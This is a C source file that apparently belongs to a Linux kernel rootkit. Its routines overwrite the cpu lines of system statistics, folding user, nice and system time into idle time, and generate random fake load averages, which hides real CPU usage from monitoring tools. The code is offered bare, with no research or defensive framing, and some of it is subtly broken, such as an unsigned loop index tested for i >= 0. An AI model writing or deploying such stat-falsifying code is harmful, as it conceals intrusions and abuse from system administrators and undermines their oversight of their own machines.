size_t myStrlen(const char *szData, const char cDelimit)
{
	size_t i;
	if(!szData) return -1;
	for(i = 0; szData[i] != 0 && szData[i] != cDelimit; i++) continue;
	return i;
}

size_t my10Exp(size_t stExp)
{
	size_t out = 1;
	for(; stExp > 0; stExp--) out*=10;
	return out;
}

size_t strtoNum(const size_t stComponent)
{
	char *szData = NULL;
	size_t out = 0;
	long i = 0;
	long j = 0;
	if(!stComponent) return 0;
	szData = (char*) stComponent;
	for(i = 0; szData[i] >= '0' && szData[i] <= '9'; i++) continue;
	if(i == 0) return 0;
	i--;
	j = i;
	for(;j>=0; j--) out += (szData[j]-'0') * (my10Exp(i-j));
	return out;
}

void numToStr(char *szOut, size_t num)
{
	unsigned int rem;
	unsigned int i = 0;
	size_t oldNum = num;
	if(!szOut) return;
	while(1)
	{
		rem = num % 10;
		num/=10;
		if(num == 0) break;
		i++;
	}
	num = oldNum;
	while(1)
	{
		rem = num % 10;
		num/=10;
		szOut[i] = rem+'0';
		if(i == 0) break;
		i--;
	}
}

void myStrCat(char *szOrig, const char *szIn)
{
	size_t i = 0;
	size_t j = 0;
	for(i = 0; 1; i++)
	{		
		if(szOrig[i] == 0)
		{
			for(j = 0; 1; j++)
			{
				szOrig[i+j] = szIn[j];
				if(szIn[j] == 0) break;
			}
			break;
		}
	}
}

int myMemcmp(const char *szComp1, const char *szComp2, size_t len1, size_t len2)
{
	size_t i = 0;
	if(!szComp1 || !szComp2) return 0;
	if(len1 != len2) return 0;
	for(i = 0; i < len1; i++)
	{
		if(szComp1[i] != szComp2[i])
		{
			return 0;
		}
	}
	return 1;
}

void getFrontPart(char *szOut, const char *szIn)
{
	size_t i = 0; 
	size_t len = 0;
	size_t spacecount = 0;
	for(len = 0; true;len++) if(szIn[len] == 0) break;
	for(i = len -1; i >= 0; i--)
	{
		if(szIn[i] == ' ') spacecount++;
		if(spacecount == 2) break;
	}
	i++;
	myStrCat(szOut, szIn+i);
}

void generateLoads(char *szOut)
{
	unsigned char rands[6];
	get_random_bytes(rands, 6);
	szOut[0] = '0';
	szOut[1] = '.';
	szOut[2] = '0' + rands[0]%2;
	szOut[3] = '0' + rands[1]%10;
	szOut[4] = ' ';
	szOut[5] = '0';
	szOut[6] = '.';
	szOut[7] = '0' + rands[2]%2;
	szOut[8] = '0' + rands[3]%10;
	szOut[9] = ' ';
	szOut[10] = '0';
	szOut[11] = '.';
	szOut[12] = '0' + rands[4]%2;
	szOut[13] = '0' + rands[5]%10;
	szOut[14] = ' ';
	szOut[15] = 0;
}

int checkParent(struct dentry *dparent)
{
	char szCompare[] = "/\0\0\0";
	const unsigned char *szName = NULL;
	if(!dparent) return 0;
	else
	{
		szName = dparent->d_name.name;
		if(!szName || !(dparent->d_name.len)) return 0;
		return myMemcmp(szName, szCompare, dparent->d_name.len, 1);
	}
	return 0;
}
int getNextLine(char **pszBuf, char *szOrig, size_t len)
{
	char *szComp = NULL;
	if(!pszBuf || !szOrig) return -1;
	for(;;(*pszBuf)++)
	{
		if((*pszBuf) >= szOrig+len) return -1;
		if((*pszBuf)[0] == 0) return -1;
		if((*pszBuf)[0] == '\n') break;
	}
	(*pszBuf)++;
	szComp = (*pszBuf);
	if(szComp[0] != 'c' || szComp[1] != 'p' || szComp[2] != 'u') return -1;
	return 0;
}

int splitLine(char *pszBuf, char *szOrig, size_t *stComponents, size_t len)
{
	size_t iCount = 1;
	if(!pszBuf || !szOrig || !stComponents) return -1;
	stComponents[0] = (size_t) pszBuf;
	for(;;pszBuf++)
	{
		if(pszBuf >= szOrig+len) return -1;
		if(pszBuf[0] == 0) return -1;
		if(pszBuf[0] == '\n') break;
		if(pszBuf[0] == ' ')
		{
			if(pszBuf[1] == ' ') pszBuf++;
			pszBuf++;
			stComponents[iCount] = (size_t) pszBuf;
			iCount++;
			if(iCount == 19) break;
		}
	}
	return 0;
}

void overWriteComponents(size_t *stComponents)
{
	int i = 0;
	int lenIdleTime = 0;
	int lenNewStats = 0;
	char newStats[] = "1 1 1 ";
	char szNewIdleTime[30] = "";
	size_t newIdleTime = 0;
	char *szOldStatsPtr = NULL;
	char *szUserTime = NULL;
	if(!stComponents) return;
	for(i = 0; i < 11; i++) if(!stComponents[i]) return;
	for(i = 0; i < 30; i++) szNewIdleTime[i] = 0;
	newIdleTime = strtoNum(stComponents[4]) + strtoNum(stComponents[1]) + strtoNum(stComponents[3]) + strtoNum(stComponents[2]);
	numToStr(szNewIdleTime, newIdleTime);
	lenIdleTime = myStrlen(szNewIdleTime, 0);
	lenNewStats = sizeof(newStats) -1;
	szUserTime = (char*) stComponents[1];
	for(i = 0; i < lenNewStats && szUserTime[0]; i++, szUserTime++) szUserTime[0] = newStats[i];
	for(i = 0; i < lenIdleTime && szUserTime[0]; i++, szUserTime++) szUserTime[0] = szNewIdleTime[i];
	for(szOldStatsPtr = (char*) stComponents[5] - 1; szOldStatsPtr[0] != '\n' && szUserTime[0] && szOldStatsPtr[0]; szOldStatsPtr++,szUserTime++) szUserTime[0] = szOldStatsPtr[0];
	for(;szUserTime < szOldStatsPtr && szUserTime[0]; szUserTime++) szUserTime[0] = ' ';
}

void processStat(char *szData, size_t len)
{
	char *pszBuf = szData;
	size_t stComponents[20];
	int i;
	for(i = 0; i < 20; i++) stComponents[i] = 0;
	while(1)
	{
		if(splitLine(pszBuf, szData, stComponents, len) == -1) break;
		overWriteComponents(stComponents);
		if(getNextLine(&pszBuf, szData, len) == -1) break;
	}
}